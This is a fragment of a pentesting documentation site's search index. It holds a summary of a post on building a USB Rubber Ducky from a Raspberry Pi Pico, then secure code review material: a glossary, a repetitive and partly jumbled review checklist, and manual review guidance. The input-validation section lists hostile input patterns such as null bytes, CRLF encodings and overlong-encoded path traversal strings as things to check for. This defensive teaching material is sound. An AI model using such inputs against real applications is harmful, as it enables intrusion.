<p><code>ENTER</code></p>"},{"location":"Pentesting/Physical/Raspberry%20Pi/usb-rubber-ducky-using-raspberry-pi-pico/#summary","title":"Summary","text":"<p>In this blog post, we explore the Raspberry Pi Pico's versatility as a microcontroller board, discussing its programmable features. We investigate the motivations behind hackers and security enthusiasts choosing the Raspberry Pi Pico for ethical hacking and security testing. Furthermore, we provide a step-by-step guide on how to create a USB Rubber Ducky using the Raspberry Pi Pico, making it an accessible tool for various security and automation applications.</p> <p>References:</p> <p>https://github.com/dbisu/pico-ducky</p>"},{"location":"Pentesting/Secure%20Code%20Review/appendix-a-glossary/","title":"Important Terminologies","text":""},{"location":"Pentesting/Secure%20Code%20Review/appendix-a-glossary/#important-terminologies","title":"Important Terminologies","text":"<p>Abuse Case: Describes the intentional and unintentional misuses of the software. Abuse cases should challenge the assumptions of the system design.</p> <p>Access Control: A set of controls that grant or deny a user, or other entity, access to a system resource. This is usually based on hierarchical roles and individual privileges within a role, but also includes system to system interactions.</p> <p>Authentication: A set of controls that are used to verify the identity of a user, or other entity, interacting with the software.</p> <p>Availability: A measure of a system's accessibility and usability.</p> <p>Canonicalize: To reduce various encodings and representations of data to a single simple form.</p> <p>Communication Security: A set of controls that help ensure the software handles the sending and receiving of information in a secure manner.</p> <p>Confidentiality: To ensure that information is disclosed only to authorize parties.</p> <p>Contextual Output Encoding: Encoding output data based on how it will be utilized by the application. The specific methods vary depending on the way the output data is used. If the data is to be included in the response to the client, account for inclusion scenarios, like: the body of an HTML document, an HTML attribute, within JavaScript, within a CSS or in a URL. You must also account for other use cases like SQL queries, XML and LDAP.</p> <p>Cross Site Request Forgery: An external website or application forces a client to make an unintended request to another application that the client has an active session with. Applications are vulnerable when they use known, or predictable, URLs and parameters; and when the browser automatically transmits all required session information with each request to the vulnerable application. (This is one of the only attacks specifically discussed in this document and is only included because the associated vulnerability is very common and poorly understood.)</p> <p>Cryptographic Practices: A set of controls that ensure cryptographic operations within the application are handled securely.</p> <p>Data Protection: A set of controls that help ensure the software handles the storing of information in a secure manner.</p> <p>Database Security: A set of controls that ensure that software interacts with a database in a secure manner and that the database is configured securely.</p> <p>Error Handling and Logging: A set of practices that ensure the application handles errors safely and conducts proper event logging.</p> <p>Exploit: To take advantage of vulnerability. Typically, this is an intentional action designed to compromise the software's security controls by leveraging vulnerability.</p> <p>File Management: A set of controls that cover the interaction between the code and other system files.</p> <p>General Coding Practices: A set of controls that cover coding practices that do not fit easily into other categories.</p> <p>Hazardous Character: Any character or encoded representation of a character that can affect the intended operation of the application or associated system by being interpreted to have a special meaning, outside the intended use of the character. These characters may be used to:</p> <p>\u2022 Altering the structure of existing code or statements</p> <p>\u2022 Inserting new unintended code</p> <p>\u2022 Altering paths</p> <p>\u2022 Causing unexpected outcomes from program functions or routines</p> <p>\u2022 Causing error conditions</p> <p>\u2022 Having any of the above effects on downstream applications or systems</p> <p>HTML Entity Encode: The process of replacing certain ASCII characters with their HTML entity equivalents. For example, encoding would replace the less than character \"&lt;\" with the HTML equivalent \"\\&lt;\". HTML entities are 'inert' in most interpreters, especially browsers, which can mitigate certain client side attacks.</p> <p>Impact: A measure of the negative effect to the business that results from the occurrence of an undesired event; what would be the result of a vulnerability being exploited.</p> <p>Input Validation: A set of controls that verify the properties of all input data matches what is expected by the application including types, lengths, ranges, acceptable character sets and does not include known hazardous characters.</p> <p>Integrity: The assurance that information is accurate, complete and valid, and has not been altered by an unauthorized action.</p> <p>Log Event Data: This should include the following:</p> <ul> <li>Time stamp from a trusted system component</li> <li>Severity rating for each event</li> <li>Tagging of security relevant events, if they are mixed with other log entries</li> <li>Identity of the account/user that caused the event</li> <li>Source IP address associated with the request</li> <li>Event outcome (success or failure)</li> <li>Description of the event</li> </ul> <p>Memory Management: A set of controls that address memory and buffer usage.</p> <p>Mitigate: Steps taken to reduce the severity of a vulnerability. These can include removing a vulnerability, making a vulnerability more difficult to exploit, or reducing the negative impact of a successful exploitation.</p> <p>Multi-Factor Authentication: An authentication process that requires the user to produce multiple distinct types of credentials. Typically, this is based on something they have (e.g., smartcard), something they know (e.g., a pin), or something they are (e.g., data from a biometric reader).</p> <p>Output Encoding: A set of controls addressing the use of encoding to ensure data output by the application is safe.</p> <p>Parameterized Queries (prepared statements): Keeps the query and data separate through the use of placeholders. The query structure is defined with place holders, the SQL statement is sent to the database and prepared, and then the prepared statement is combined with the parameter values. This prevents the query from being altered, because the parameter values are combined with the compiled statement, not a SQL string.</p> <p>Sanitize Data: The process of making potentially harmful data safe through the use of data removal, replacement, encoding or escaping of the characters.</p> <p>Security Controls: An action that mitigates a potential vulnerability and helps ensure that the software behaves only in the expected manner.</p> <p>Security Requirements: A set of design and functional requirements that help ensure the software is built and deployed in a secure manner.</p> <p>Sequential Authentication: When authentication data is requested on successive pages rather than being requested all at once on a single page.</p> <p>Session Management: A set of controls that help ensure web applications handle HTTP sessions in a secure manner.</p> <p>State Data: When data or parameters are used, by the application or server, to emulate a persistent connection or track a client's status across a multi-request process or transaction.</p> <p>System: A generic term covering the operating systems, web server, application frameworks and related infrastructure.</p> <p>System Configuration: A set of controls that help ensure the infrastructure components supporting the software are deployed securely.</p> <p>Threat Agent: Any entity which may have a negative impact on the system. This may be a malicious user who wants to compromise the system's security controls; however, it could also be an accidental misuse of the system or a more physical threat like fire or flood.</p> <p>Trust Boundaries: Typically, a trust boundary constitutes the components of the system under your direct control. All connections and data from systems outside of your direct control, including all clients and systems managed by other parties, should be consider untrusted and be validated at the boundary, before allowing further system interaction.</p> <p>Vulnerability: A weakness that makes the system susceptible to attack or damage.</p>"},{"location":"Pentesting/Secure%20Code%20Review/code-review-checklist/","title":"Code Review Checklist","text":""},{"location":"Pentesting/Secure%20Code%20Review/code-review-checklist/#code-review-checklist","title":"Code Review Checklist","text":"CATEGORY DESCRIPTION General Are there backdoor/unexposed business logic classes? <p>Business Logic andDesign</p> Are there unused configurations related to business logic? <p>Business Logic andDesign</p> If request parameters are used to identify business logic methods, is there a proper mapping of user privileges and methods/actions allowed to them? <p>Business Logic andDesign</p> Check if unexposed instance variables are present in form objects that get bound to user inputs.If present, check if they have default values. <p>Business Logic andDesign</p> <p>Check if unexposed instance variables present in form objects that get bound to user inputs. Ifpresent, check if they get initialized before form binding.</p> Authorization Is the placement of authentication and authorization check correct? Authorization <p>Is there execution stopped/terminated after for invalid request? I.e. when authentication/autho-rization check fails?</p> Authorization Are the checks correct implemented? Is there any backdoor parameter? Authorization Is the check applied on all the required files and folder within web root directory? Authorization Are security checks placed before processing inputs? <p>Business Logic andDesign</p> <p>Check if unexposed instance variables are present in form objects that get bound to user inputs.If present, check if they have default values.</p> <p>Business Logic andDesign</p> <p>Check if unexposed instance variables present in form objects that get bound to user inputs. Ifpresent, check if they get initialized before form binding.</p> Authorization <p>Is there execution stopped/terminated after for invalid request? I.e. when authentication/autho-rization check fails?</p> <p>Business Logic andDesign</p> Are the checks correct implemented? Is there any backdoor parameter? <p>Business Logic andDesign</p> Is the check applied on all the required files and folder within web root directory? <p>Business Logic andDesign</p> Is there any default configuration like Access- ALL? <p>Business Logic andDesign</p> Does the configuration get applied to all files and users? Authorization Incase of container-managed authentication - Is the authentication based on web methods only? Authorization <p>Incase of container-managed authentication - Does the authentication get applied on allresources?</p> <p>SessionManagement</p> Does the design handle sessions securely? Authorization Incase of container-managed authentication - Is the authentication based on web methods only? Authorization Is Password Complexity Check enforced on the password? Cryptography Is password stored in an encrypted format? Authorization Is password disclosed to user/written to a file/logs/console? Cryptography Are database credentials stored in an encrypted format <p>Business Logic andDesign</p> Does the design support weak data stores like flat files <p>Business Logic andDesign</p> Does the centralized validation get applied to all requests and all the inputs? <p>Business Logic andDesign</p> Does the centralized validation check block all the special characters? <p>Business Logic andDesign</p> Does are there any special kind of request skipped from validation? <p>Business Logic andDesign</p> Does the design maintain any exclusion list for parameters or features from being validated? Imput Validation <p>Are all the untrusted inputs validated?Input data is constrained and validated for type, length, format, and range.</p> Cryptography <p>Is the data sent on encrypted channel? Does the application use HTTPClient for making externalconnections?</p> <p>SessionManagement</p> Does the design involve session sharing between components/modules? Is session validated correctly on both ends? <p>Business Logic andDesign</p> Does the design use any elevated OS/system privileges for external connections/commands? <p>Business Logic andDesign</p> Is there any known flaw(s) in API\u2019s/Technology used? For eg: DWR <p>Business Logic andDesign</p> <p>Does the design framework provide any inbuilt security control? Like &lt;%: %&gt; in ASP.NET MVC? Isthe application taking advantage of these controls?</p> <p>Business Logic andDesign</p> Are privileges reduce whenever possible? <p>Business Logic andDesign</p> Is the program designed to fail gracefully? <p>Logging andAuditing</p> Are logs logging personal information, passwords or other sensitive information? <p>Logging andAuditing</p> Do audit logs log connection attempts (both successful and failures)? <p>Logging andAuditing</p> Is there a process(s) in place to read audit logs for unintended/malicious behaviors? Cryptography Is all PI and sensitive information being sent over the network encrypted form. Authorization Does application design call for server authentication (anti-spoofing measure)? Authorization Does application support password expiration? Cryptography Does application use custom schemes for hashing and or cryptographic? Cryptography <p>Are cryptographic functions used by the application the most recent version of these protocols,patched and process in place to keep them updated?</p> General <p>Are external libraries, tools, plugins used by the application functions the most recent version ofthese protocols, patched and process in place to keep them updated?</p> General Classes that contain security secrets (like passwords) are only accessible through protected API\u2019s Cryptography Does are there any special kind of request skipped from validation? General Classes that contain security secrets (like passwords) are only accessible through protected API\u2019s Cryptography Keys are not held in code. General Plain text secrets are not stored in memory for extended periods of time. General Array bounds are checked. <p>User Managementand Authentication</p> User and role based privileges are documented General All sensitive information used by application has been identified <p>User Managementand Authentication</p> Authentication cookies are not persisted <p>User Managementand Authentication</p> Authentication cookies are encrypted <p>User Managementand Authentication</p> Authentication credentials are not passed by HTTP GET <p>User Managementand Authentication</p> Authorization checks are granular (page and directory level) <p>User Managementand Authentication</p> Authorization based on clearly defined roles <p>User Managementand Authentication</p> Authorization works properly and cannot be circumvented by parameter manipulation <p>User Managementand Authentication</p> Authorization cannot be bypassed by cookie manipulation <p>SessionManagement</p> No session parameters are passed in URLs <p>SessionManagement</p> Session cookies expire in a reasonable short time <p>SessionManagement</p> Session cookies are encrypted <p>SessionManagement</p> Session data is validated <p>SessionManagement</p> Session id is complex <p>SessionManagement</p> Session storage is secure <p>SessionManagement</p> Session inactivity timeouts are enforced Data Management Data is validated on server side Data Management HTTP headers are validated for each request <p>Business Logic andDesign</p> <p>Are all of the entry points and trust boundaries identified by the design and are in risk analysisreport?</p> Data Management Is all XML input data validated against an agreed schema? Data Management <p>Is output that contains untrusted data supplied input have the correct type of encoding (URLencoding, HTML encoding)?</p> Data Management Has the correct encoding been applied to all data being output by the application Web Services <p>Web service has documentation protocol is disable if the application does not need dynamicgeneration of WSDL.</p> Web Services Web service endpoints address in Web Services Description Language (WSDL) is checked for validity Web Services Web service protocols that are unnecessary are disable (HTTP GET and HTTP POST"},{"location":"Pentesting/Secure%20Code%20Review/manual-code-review/","title":"Manual Code Review Checklist","text":""},{"location":"Pentesting/Secure%20Code%20Review/manual-code-review/#manual-code-review-checklist","title":"Manual  Code Review Checklist","text":""},{"location":"Pentesting/Secure%20Code%20Review/manual-code-review/#input-validation","title":"Input Validation","text":"<ul> <li>Conduct all data validation on a trusted system (e.g., The server)</li> <li>Identify all data sources and classify them into trusted and untrusted. Validate all data from untrusted sources (e.g., Databases, file streams, etc.)</li> <li>There should be a centralized input validation routine for the application</li> <li>Specify proper character sets, such as UTF-8, for all sources of input</li> <li>Encode data to a common character set before validating (Canonicalize)</li> <li>All validation failures should result in input rejection</li> <li>Determine if the system supports UTF-8 extended character sets and if so, validate after UTF-8 decoding is completed</li> <li>Validate all client provided data before processing, including all parameters, URLs and HTTP header content (e.g. Cookie names and values). Be sure to include automated post backs from JavaScript, Flash or other embedded code</li> <li>Verify that header values in both requests and responses contain only ASCII characters</li> <li>Validate data from redirects (An attacker may submit malicious content directly to the target of the redirect, thus circumventing application logic and any validation performed before the redirect)</li> <li>Validate for expected data types</li> <li>Validate data range</li> <li>Validate data length</li> <li>Validate all input against a \"white\" list of allowed characters, whenever possible</li> <li>If any potentially hazardous characters must be allowed as input, be sure that you implement additional controls like output encoding, secure task specific APIs and accounting for the utilization of that data throughout the application. Examples of common hazardous characters include:</li> </ul> <p><code>&lt; &gt; \" ' % ( ) &amp; + \\ \\' \\\"</code></p> <ul> <li>If your standard validation routine cannot address the following inputs, then they should be checked discretely</li> <li>Check for null bytes (%00)</li> <li>Check for new line characters (%0d, %0a, \\r, \\n)</li> <li>Check for \u201cdot-dot-slash\" (../ or ..\\) path alterations characters. In cases where UTF-8 extended character set encoding is supported, address alternate representation like: %c0%ae%c0%ae/</li> </ul> <p>(Utilize canonicalization to address double encoding or other forms of obfuscation attacks)</p>"},{"location":"Pentesting/Secure%20Code%20Review/manual-code-review/#output-encoding","title":"Output Encoding","text":"<ul> <li>Conduct all encoding on a trusted system (e.g., the server)</li> <li>Utilize a standard, tested routine for each type of outbound encoding</li> <li>Contextually output encode all data returned to the client that originated outside the application's trust boundary. HTML entity encoding is one example, but does not work in all cases</li> <li>Encode all characters unless they are known to be safe for the intended interpreter</li> <li>Contextually sanitize all output of un-trusted data to queries for SQL, XML, and LDAP</li> <li>Sanitize all output of un-trusted data to operating system commands</li> </ul>"},{"location":"Pentesting/Secure%20Code%20Review/manual-code-review/#authentication-and-password-management","title":"Authentication and Password Management","text":"<ul> <li>Password or any other sensitive information must be encrypted for validation.</li> <li>All authentication controls must be enforced on a trusted system (e.g., The server)</li> <li>When password reset functionality is required, generate a temporary password that is sent to the user using the registered email address.</li> <li>Use a centralized implementation for all authentication controls, including libraries that call external authentication services</li> <li>Enforce the user to change the password upon first login and password reset.</li> <li>Cookies should not be used to provide authentication or authorization details beyond a session or other unique identifier.</li> <li>All administrative and account management functions must be at least as secure as the primary authentication mechanism</li> <li>If your application manages a credential store, it should ensure that only cryptographically strong one-way salted hashes of passwords are stored and that the table/file that stores the passwords and keys is write-able only by the application. (Do not use the MD5 algorithm if it can be avoided)</li> <li>Authentication failure responses should not indicate which part of the authentication data was incorrect. For example, instead of \"Invalid username\" or \"Invalid password\", just use \"Invalid username and/or password\" for both. Error responses must be truly identical in both display and source code</li> <li>Use only HTTP POST requests to transmit authentication credentials</li> <li>Do not send user\u2019s login information as a clear text in email.</li> <li>Enforce password complexity requirements established by policy or regulation. Authentication credentials should be sufficient to withstand attacks that are typical of the threats in the deployed environment. (e.g., requiring the use of alphabetic as well as numeric and/or special characters)</li> <li>Enforce password length requirements established by policy or regulation. Eight characters is commonly used, but 16 is better or consider the use of multi-word pass phrases</li> <li>Password entry should be obscured on the user's screen. (e.g., on web forms use the input type \"password\")</li> <li>Enforce account disabling after an established number of invalid login attempts (e.g., five attempts is common). The account must be disabled for a period of time sufficient to discourage brute force guessing of credentials, but not so long as to allow for a denial-of-service attack to be performed</li> <li>Password reset and changing operations require the same level of controls as account creation and authentication.</li> <li>Password reset questions should support sufficiently random answers. (e.g., \"favourite book\" is a bad question because \u201cThe Bible\u201d is a very common answer)</li> <li>If using email-based resets, only send email to a pre-registered address with a temporary link/password</li> <li>Temporary passwords and links should have a short expiration time</li> <li>Enforce the changing of temporary passwords on the next use</li> <li>Notify users when a password reset occurs</li> <li>Prevent password re-use</li> <li>Passwords should be at least one day old before they can be changed, to prevent attacks on password re-use</li> <li>Enforce password changes based on requirements established in policy or regulation. Critical systems may require more frequent changes. The time between resets must be administratively controlled</li> <li>Disable \"remember me\" functionality for password fields</li> <li>The last use (successful or unsuccessful) of a user account should be reported to the user at their next successful login</li> <li>Implement monitoring to identify attacks against multiple user accounts, utilizing the same password. This attack pattern is used to bypass standard lockouts, when user IDs can be harvested or guessed</li> <li>Change all vendor-supplied default passwords and user IDs or disable the associated accounts</li> <li>Re-authenticate users prior to performing critical operations</li> <li>Use Multi-Factor Authentication for highly sensitive or high value transactional accounts</li> <li>If using third party code for authentication, inspect the code carefully to ensure it is not affected by any malicious code</li> </ul>"},{"location":"Pentesting/Secure%20Code%20Review/manual-code-review/#session-management","title":"Session Management","text":"<ul> <li>Use the server or framework\u2019s session management controls. The application should only recognize these session identifiers as valid</li> <li>Session identifier creation must always be done on a trusted system (e.g., The server)</li> <li>Session management controls should use well vetted algorithms that ensure sufficiently random session identifiers</li> <li>Set the domain and path for cookies containing authenticated session identifiers to an appropriately restricted value for the site</li> <li>Logout functionality should fully terminate the associated session or connection</li> <li>Logout functionality should be available from all pages protected by authorization</li> <li>Disallow persistent logins and enforce periodic session terminations, even when the session is active. Especially for applications supporting rich network connections or connecting to critical systems. Termination times should support business requirements and the user should receive sufficient notification to mitigate negative impacts</li> <li>If a session was established before login, close that session and establish a new session after a successful login</li> <li>Generate a new session identifier on any re-authentication</li> <li>Do not allow concurrent logins with the same user ID</li> <li>Do not expose session identifiers in URLs, error messages or logs. Session identifiers should only be located in the HTTP cookie header. For example, do not pass session identifiers as GET parameters</li> <li>Protect server-side session data from unauthorized access, by other users of the server, by implementing appropriate access controls on the server</li> <li>Generate a new session identifier and deactivate the old one periodically. (This can mitigate certain session hijacking scenarios where the original identifier was compromised)</li> <li>Generate a new session identifier if the connection security changes from HTTP to HTTPS, as can occur during authentication. Within an application, it is recommended to consistently utilize HTTPS rather than switching between HTTP to HTTPS.</li> <li>Supplement standard session management for sensitive server-side operations, like account management, by utilizing per-session strong random tokens or parameters. This method can be used to prevent Cross Site Request Forgery attacks</li> <li>Supplement standard session management for highly sensitive or critical operations by utilizing per-request, as opposed to per-session, strong random tokens or parameters</li> <li>Set the \"secure\" attribute for cookies transmitted over a TLS connection</li> <li>Set cookies with the HttpOnly attribute, unless you specifically require client-side scripts within your application to read or set a cookie's value</li> </ul>"},{"location":"Pentesting/Secure%20Code%20Review/manual-code-review/#access-control","title":"Access Control","text":"<ul> <li>Use only trusted system objects, e.g. server-side session objects, for making access authorization decisions</li> <li>Use a single site-wide component to check access authorization. This includes libraries that call external authorization services</li> <li>Access controls should fail securely</li> <li>Deny all access if the application cannot access its security configuration information</li> <li>Enforce authorization controls on every request, including those made by server side scripts, \"includes\" and requests from rich client-side technologies like AJAX and Flash</li> <li>Segregate privileged logic from other application code</li> <li>Restrict access to files or other resources, including those outside the application's direct control, to only authorized users</li> <li>Restrict access to protected URLs to only authorized users</li> <li>Restrict access to protected functions to only authorized users</li> <li>Restrict direct object references to only authorized users</li> <li>Restrict access to services to only authorized users</li> <li>Restrict access to application data to only authorized users</li> <li>Restrict access to user and data attributes and policy information used by access controls</li> <li>Restrict access security-relevant configuration information to only authorized users</li> <li>Server side implementation and presentation layer representations of access control rules must match</li> <li>If state data must be stored on the client, use encryption and integrity checking on the server side to catch state tampering.</li> <li>Enforce application logic flows to comply with business rules</li> <li>Limit the number of transactions a single user or device can perform in a given period of time. The transactions/time should be above the actual business requirement, but low enough to deter automated attacks</li> <li>Use the \"referrer\" header as a supplemental check only, it should never be the sole authorization check, as it is can be spoofed</li> <li>If long authenticated sessions are allowed, periodically re-validate a user\u2019s authorization to ensure that their privileges have not changed and if they have, log the user out and force them to re-authenticate</li> <li>Implement account auditing and enforce the disabling of unused accounts (e.g., after no more than 30 days from the expiration of an account\u2019s password.)</li> <li>The application must support disabling of accounts and terminating sessions when authorization ceases (e.g., Changes to role, employment status, business process, etc.)</li> <li>Service accounts or accounts supporting connections to or from external systems should have the least privilege possible</li> <li>Create an Access Control Policy to document an application's business rules, data types and access authorization criteria and/or processes so that access can be properly provisioned and controlled. This includes identifying access requirements for both the data and system resources</li> </ul>"},{"location":"Pentesting/Secure%20Code%20Review/manual-code-review/#cryptographic-properties","title":"Cryptographic Properties","text":"<ul> <li>All cryptographic functions used to protect secrets from the application user must be implemented on a trusted system (e.g., The server)</li> <li>Protect master secrets from unauthorized access</li> <li>Cryptographic modules should fail securely</li> <li>All random numbers, random file names, random GUIDs, and random strings should be generated using the cryptographic module\u2019s approved random number generator when these random values are intended to be un-guessable</li> <li>Cryptographic modules used by the application should be compliant to FIPS 140-2 or an equivalent standard. (See http://csrc.nist.gov/groups/STM/cmvp/validation.html)</li> <li>Establish and utilize a policy and process for how cryptographic keys will be managed</li> </ul>"},{"location":"Pentesting/Secure%20Code%20Review/manual-code-review/#error-handling-and-logging","title":"Error Handling and Logging","text":"<ul> <li>Check if Stacktrace is printed on console(Web, Server)</li> <li>Do not show/write sensitive data in error pages, error messages, log files, and audit files</li> <li>Do not provide any information about system or application configurations back to a user (e.g. IP Address, hostname etc.) in error pages, error messages, log files, and audit files</li> <li>Input directly take from the user is getting printed (Log Forging)</li> <li>The log file name is created by inputs from users (Resource Injection).</li> <li>Limit check is there or not for the amount of data written to the log file</li> <li>System.out.println() is used to write instead of log files</li> </ul>"},{"location":"Pentesting/Secure%20Code%20Review/manual-code-review/#data-protection","title":"Data Protection","text":"<ul> <li>Implement least privilege, restrict users to only the functionality, data, and system information that is required to perform their tasks</li> <li>Mask sensitive data in UI</li> <li>Guard sensitive data during serialization</li> <li>Highly sensitive information should be considered purging from memory after use.</li> <li>Protect all cached or temporary copies of sensitive data stored on the server from unauthorized access and purge those temporary working files a soon as they are no longer required.</li> <li>Encrypt highly sensitive stored information, like authentication verification data, even on the server side. Always use well vetted algorithms, see \"Cryptographic Practices\" for additional guidance</li> <li>Protect server-side source-code from being downloaded by a user</li> <li>Do not store passwords, connection strings, or other sensitive information in clear text or in any non-cryptographically secure manner on the client side. This includes embedding in insecure formats like MS viewstate, Adobe flash, or compiled code</li> <li>Remove comments in user-accessible production code that may reveal backend system or other sensitive information</li> <li>Remove unnecessary application and system documentation as this can reveal useful information to attackers</li> <li>Do not include sensitive information in HTTP GET request parameters</li> <li>Disable auto-complete features on forms expected to contain sensitive information, including authentication</li> <li>Disable client-side caching on pages containing sensitive information. Cache-Control: no-store, may be used in conjunction with the HTTP header control \"Pragma: no-cache\", which is less effective, but is HTTP/1.0 backward compatible</li> <li>The application should support the removal of sensitive data when that data is no longer required. (e.g. personal information or certain financial data)</li> <li>Implement appropriate access controls for sensitive data stored on the server. This includes cached data, temporary files, and data that should be accessible only by specific system users</li> </ul>"},{"location":"Pentesting/Secure%20Code%20Review/manual-code-review/#communication-security","title":"Communication Security","text":"<ul> <li>Implement encryption for the transmission of all sensitive information. This should include TLS for protecting the connection and may be supplemented by discrete encryption of sensitive files or non-HTTP based connections</li> <li>TLS certificates should be valid and have the correct domain name, not be expired, and be installed with intermediate certificates when required</li> <li>Failed TLS connections should not fall back to an insecure connection</li> <li>Utilize TLS connections for all content requiring authenticated access and for all other sensitive information</li> <li>Utilize TLS for connections to external systems that involve sensitive information or functions</li> <li>Utilize a single standard TLS implementation that is configured appropriately</li> <li>Specify character encodings for all connections</li> <li>Filter parameters containing sensitive information from the HTTP referrer, when linking to external sites</li> </ul>"},{"location":"Pentesting/Secure%20Code%20Review/manual-code-review/#system-configuration","title":"System Configuration","text":"<ul> <li>Ensure servers, frameworks and system components are running the latest approved version</li> <li>Ensure servers, frameworks and system components have all patches issued for the version in use</li> <li>Turn off directory listings</li> <li>Restrict the web server, process and service accounts to the least privileges possible</li> <li>When exceptions occur, fail securely</li> <li>Remove all unnecessary functionality and files</li> <li>Remove test code or any functionality not intended for production, prior to deployment</li> <li>Prevent disclosure of your directory structure in the robots.txt file by placing directories not intended for public indexing into an isolated parent directory. Then \"Disallow\" that entire parent directory in the robots.txt file rather than disallowing each individual directory</li> <li>Define which HTTP methods, Get or Post, the application will support and whether it will be handled differently in different pages in the application</li> <li>Disable unnecessary HTTP methods, such as WebDAV extensions. If an extended HTTP method that supports file handling is required, utilize a well-vetted authentication mechanism</li> <li>If the web server handles both HTTP 1.0 and 1.1, ensure that both are configured in a similar manor or insure that you understand any difference that may exist (e.g. handling of extended HTTP methods)</li> <li>Remove unnecessary information from HTTP response headers related to the OS, web-server version and application frameworks</li> <li>The security configuration store for the application should be able to be output in human readable form to support auditing</li> <li>Implement an asset management system and register system components and software in it</li> <li>Isolate development environments from the production network and provide access only to authorized development and test groups. Development environments are often configured less securely than production environments and attackers may use this difference to discover shared weaknesses or as an avenue for exploitation</li> <li>Implement a software change control system to manage and record changes to the code both in development and production</li> </ul>"},{"location":"Pentesting/Secure%20Code%20Review/manual-code-review/#database-security","title":"Database Security","text":"<ul> <li>Use strongly typed parameterized queries</li> <li>Utilize input validation and output encoding and be sure to address meta characters. If these fail, do not run the database command</li> <li>Ensure that variables are strongly typed</li> <li>The application should use the lowest possible level of privilege when accessing the database</li> <li>Use secure credentials for database access</li> <li>Connection strings should not be hard coded within the application. Connection strings should be stored in a separate configuration file on a trusted system and they should be encrypted.</li> <li>Use stored procedures to abstract data access and allow for the removal of permissions to the base tables in the database</li> <li>Close the connection as soon as possible</li> <li>Remove or change all default database administrative passwords. Utilize strong passwords/phrases or implement multi-factor authentication</li> <li>Turn off all unnecessary database functionality (e.g., unnecessary stored procedures or services, utility packages, install only the minimum set of features and options required (surface area reduction))</li> <li>Remove unnecessary default vendor content (e.g., sample schemas)</li> <li>Disable any default accounts that are not required to support business requirements</li> <li>The application should connect to the database with different credentials for every trust distinction (e.g., user, read-only user, guest, administrators)</li> <li>Avoid dynamic queries in the application</li> </ul>"},{"location":"Pentesting/Secure%20Code%20Review/manual-code-review/#file-management","title":"File Management","text":"<ul> <li>Do not pass user supplied data directly to any dynamic include function</li> <li>Require authentication before allowing a file to be uploaded</li> <li>Limit the type of files that can be uploaded to only those types that are needed for business purposes</li> <li>Validate uploaded files are the expected type by checking file headers. Checking for file type by extension alone is not sufficient</li> <li>Do not save files in the same web context as the application. Files should either go to the content server or in the database.</li> <li>Prevent or restrict the uploading of any file that may be interpreted by the web server.</li> <li>Turn off execution privileges on file upload directories</li> <li>Implement safe uploading in UNIX by mounting the targeted file directory as a logical drive using the associated path.</li> <li>When referencing existing files, use a white list of allowed file names and types. Validate the value of the parameter being passed and if it does not match one of the expected values, either reject it or use a hard-coded default file value for the content instead</li> <li>Do not pass user supplied data into a dynamic redirect. If this must be allowed, then the redirect should accept only validated, relative path URLs</li> <li>Do not pass directory or file paths, use index values mapped to pre-defined list of paths</li> <li>Never send the absolute file path to the client</li> <li>Ensure application files and resources are read-only</li> </ul> <p>Scan user uploaded files for viruses and malware</p>"},{"location":"Pentesting/Secure%20Code%20Review/manual-code-review/#memory-management","title":"Memory Management","text":"<p>The buffer overflow attack involves sending large amounts of data that exceed the quantities expected by the application within a given field. Such attacks cause the application to abandon its normal behavior and begin executing commands on behalf of the attacker.</p> <p> Attackers find buffer overflow vulnerabilities by searching for system calls and functions that do not restrict the length and type of input. This can be done manually or electronically with a code inspection tool. The attacker can also run a brute force attack against the program in the hope of finding vulnerabilities in the code. Once the attacker finds a vulnerability, custom code is inserted that does not crash the system, rather instructs it to execute other commands or programs of the attacker desire.</p> <ul> <li>Utilize input and output control for un-trusted data. All code that accepts input from users via an HTTP request must be reviewed to ensure that it can identify large input. Once inappropriate data is identified the activity must be logged and the data dropped.</li> <li>All data input fields must have reasonable field lengths and specific data types. Limit the amount of text allowed in free form fields.</li> <li>Routinely check the code of web applications during their development phase to assure that the design is secured as built.</li> <li>Double check that the buffer is as large as specified</li> <li>When using functions that accept a number of bytes to copy, such as strncpy(), be aware that if the destination buffer size is equal to the source buffer size, it may not NULL-terminate the string</li> <li>Check buffer boundaries if calling the function in a loop and make sure there is no danger of writing past the allocated space</li> <li>Truncate all input strings to a reasonable length before passing them to the copy and concatenation functions</li> <li>Specifically, close resources, don\u2019t rely on garbage collection. (e.g., connection objects, file handles, etc.)</li> <li>Use non-executable stacks when available</li> <li>Avoid the use of known vulnerable functions (e.g., printf, strcat, strcpy etc.)</li> <li>Properly free allocated memory upon the completion of functions and at all exit points</li> </ul>"},{"location":"Pentesting/Secure%20Code%20Review/manual-code-review/#general-coding-practices","title":"General Coding Practices","text":"<ul> <li>Use tested and approved managed code rather than creating new unmanaged code for common tasks</li> <li>Utilize task specific built-in APIs to conduct operating system tasks. Do not allow the application to issue commands directly to the Operating System, especially through the use of application-initiated command shells</li> <li>Use checksums or hashes to verify the integrity of interpreted code, libraries, executables, and configuration files</li> <li>Utilize locking to prevent multiple simultaneous requests or use a synchronization mechanism to prevent race conditions</li> <li>Protect shared variables and resources from inappropriate concurrent access</li> <li>Explicitly initialize all your variables and other data stores, either during declaration or just before the first usage</li> <li>In cases where the application must run with elevated privileges, raise privileges as late as possible, and drop them as soon as possible</li> <li>Avoid calculation errors by understanding your programming language's underlying representation and how it interacts with numeric calculation. Pay close attention to byte size discrepancies, precision, signed/unsigned distinctions, truncation, conversion and casting between types, \"not-a-number\" calculations, and how your language handles numbers that are too large or too small for its underlying representation</li> <li>Do not pass user supplied data to any dynamic execution function</li> <li>Restrict users from generating new code or altering existing code</li> <li>Review all secondary applications, third party code and libraries to determine business necessity and validate safe functionality, as these can introduce new vulnerabilities</li> <li>Implement safe updating. If the application will utilize automatic updates, then use cryptographic signatures for your code and ensure your download clients verify those signatures. Use encrypted channels to transfer the code from the host server.</li> <li>Race condition in case of multithreaded scenario</li> <li>Cryptographic algorithms (Hashing Algorithm, Key Strength, Encryption algorithms used</li> <li>Random Number generation logic for its implementation</li> <li>OTP generation logic</li> <li>Authentication Logic, parameters and factors (Its Randomness and its Uniqueness)</li> <li>External Interface Integration and the data flow over that</li> </ul>"},{"location":"Pentesting/Secure%20Code%20Review/recommendation-and-references/","title":"Recommendation and References","text":""},{"location":"Pentesting/Secure%20Code%20Review/recommendation-and-references/#recommendation-and-references","title":"Recommendation and References","text":""},{"location":"Pentesting/Secure%20Code%20Review/recommendation-and-references/#additional-general-practices-and-resources","title":"Additional General Practices and Resources","text":"<ul> <li> <p>Clearly define roles and responsibilities</p> </li> <li> <p>Provide development teams with adequate software security training</p> </li> <li> <p>Implement a secure software development lifecycle: OWASP CLASP Project</p> </li> <li> <p>Establish 